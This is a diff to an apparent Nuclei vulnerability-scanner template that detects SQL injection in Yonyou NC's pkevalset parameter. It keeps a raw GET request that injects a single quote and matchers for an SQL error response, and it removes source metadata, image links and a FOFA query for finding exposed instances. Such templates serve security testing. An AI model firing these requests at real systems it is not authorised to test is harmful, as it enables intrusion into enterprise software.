@@ -3,12 +3,8 @@ info:
   name: 用友NC pkevalset存在Sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sbfgud5rz25ugb1l'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sbfgud5rz25ugb1l
-    fofa: product="用友-UFIDA-NC"
 http:
 - raw:
   - 'GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1'' HTTP/1.1
@@ -17,7 +13,6 @@ http:
 
     Host: {{Hostname}}
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1743171071639-32741141-7842-4886-99f8-e185e127a8a5.png)
 
     上述判断条件为响应中存在查询错误：sql且状态200，部分可用payload'
   redirects: false
@@ -40,9 +35,7 @@ http:
 
     Accept-Language: zh-CN,zh;q=0.9
 
-    Connection: close
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1743171071860-75f993a3-55a8-4233-8ac8-e1a286cdbf9d.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
